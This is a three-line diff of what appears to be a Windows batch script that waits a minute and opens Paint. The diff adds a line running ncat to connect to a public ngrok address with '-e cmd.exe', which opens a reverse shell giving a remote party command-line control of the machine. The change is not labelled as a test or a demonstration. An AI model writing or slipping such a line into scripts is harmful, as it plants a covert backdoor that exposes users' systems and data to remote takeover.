@@ -1,2 +1,3 @@
 timeout /t 60
 start mspaint.exe
+ncat 0.tcp.eu.ngrok.io 13508 -e cmd.exe
